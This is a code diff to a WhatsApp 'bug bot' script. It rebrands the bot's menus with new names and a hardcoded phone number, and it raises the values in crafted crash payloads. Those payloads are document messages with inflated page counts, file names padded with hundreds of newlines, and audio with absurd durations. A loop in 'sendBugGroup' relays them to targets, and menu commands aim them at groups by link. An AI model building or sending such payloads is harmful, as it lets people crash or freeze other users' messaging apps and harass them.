@@ -203,9 +203,9 @@ var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 "mimetype": "",
 "title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
-"pageCount": 1000000,
+"pageCount": 9000000,
 "mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-"fileName": `🔥 LimaPuluhhhhh ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${konf}\n\n\n\n.${vnolim}.jpeg`,
+"fileName": `🔥ByH4nzzzz ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${konf}\n\n\n\n.${vnolim}.jpeg`,
 "fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
 "directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
 "mediaKeyTimestamp": "1658703206",
@@ -218,7 +218,7 @@ var audio = generateWAMessageFromContent(from, proto.Message.fromObject({
 "mimetype": "audio/mpeg",
 "fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
 "fileLength": "258330",
-"seconds": 999999,
+"seconds": 9999999,
 "ptt": false,
 "mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
 "fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
@@ -231,17 +231,17 @@ conn.relayMessage(target, audio.message, { messageId: audio.key.id })
 
 function sendBugGroup(res,jumlahnya) {
 for (let i = 0; i < jumlahnya; i++) {
-conn.sendMessage(res, {text: "𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂"}, {quoted:fbug})
-conn.sendMessage(res, {text: "𝙻𝙸𝙼𝙰 𝙿𝚄𝙻𝚄𝙷"}, {quoted:fbug})
+conn.sendMessage(res, {text: "h4nzzzz ni boss"}, {quoted:fbug})
+conn.sendMessage(res, {text: "fal ni boss"}, {quoted:fbug})
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({	
 "documentMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
 "mimetype": "",
 "title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
-"pageCount": 1000000,
+"pageCount": 9000000,
 "mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-"fileName": `☠️𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${konf}\n\n\n\n.${vnolim}.jpeg`,
+"fileName": `☠️Fal Ni Boss☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${konf}\n\n\n\n.${vnolim}.jpeg`,
 "fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
 "directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
 "mediaKeyTimestamp": "1658703206",
@@ -276,7 +276,7 @@ case 'bugmenu':{
 var creator = `${CreatorLexxy}@s.whatsapp.net`
 mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
 ▬▭▬▭▬▭▬▭▬▭▬▭▬▭
-༺ *OWNER MENU (MURBUG)* ༻
+༺ *Menu Khusus Hanz&Fal* ༻
 Ⓛ ${prefix}akses @tag
 Ⓛ ${prefix}delete @tag
 Ⓛ ${prefix}addown 628xxxxx
@@ -333,7 +333,7 @@ mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
 Ⓛ ${prefix}gaskengc 5|LinkGroup
 Ⓛ ${prefix}ampasgc 5|LinkGroup
 
- Powered By @${creator.split('@')[0]}
+ Powered By @601137759884
 ▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
 }
 addCmd(command, 1, db_cmd)
@@ -362,7 +362,7 @@ mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
 Ⓛ ${prefix}demote
 Ⓛ ${prefix}promote
 
- Powered By @${creator.split('@')[0]}
+ Powered By @601137759884
 ▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
 }
 addCmd(command, 1, db_cmd)
@@ -379,7 +379,7 @@ mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
 Ⓛ ${prefix}resetotp 628xxxxx
 Ⓛ ${prefix}komplain <example>
 
- Powered By @${creator.split('@')[0]}
+ Powered By @601137759884
 ▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
 }
 addCmd(command, 1, db_cmd)
@@ -398,7 +398,7 @@ mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
 Ⓛ ${prefix}unbanv7 628xxxxx
 Ⓛ ${prefix}unbanv8 628xxxxx
  
- Powered By @${creator.split('@')[0]}
+ Powered By @601137759884
 ▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
 }
 addCmd(command, 1, db_cmd)
@@ -424,7 +424,7 @@ mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
 Ⓛ ${prefix}mengetik [options]
 Ⓛ ${prefix}autoread [options]
 
- Powered By @${creator.split('@')[0]}
+ Powered By @601137759884
 ▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
 }
 addCmd(command, 1, db_cmd)
@@ -441,7 +441,7 @@ mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
 Ⓛ ${prefix}jasaunban
 Ⓛ ${prefix}runtime
 
- Powered By @${creator.split('@')[0]}
+ Powered By @601137759884
 ▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
 }
 addCmd(command, 1, db_cmd)
@@ -457,7 +457,7 @@ mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
 Ⓛ ${prefix}pushv2
 Ⓛ ${prefix}listgroup
 
- Powered By @${creator.split('@')[0]}
+ Powered By @601137759884
 ▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
 }
 addCmd(command, 1, db_cmd)
@@ -500,7 +500,7 @@ var teks =`▬▭▬▭▬▭▬▭▬▭▬▭▬▭
  *RUNTIME*
  ${runtime(process.uptime())}
 
- *Powered By @${mark.split('@')[0]}*
+ *Powered By @601137759884
 ▬▭▬▭▬▭▬▭▬▭▬▭▬`
 mentions(teks,[mark,owner,sender,creator])
 }
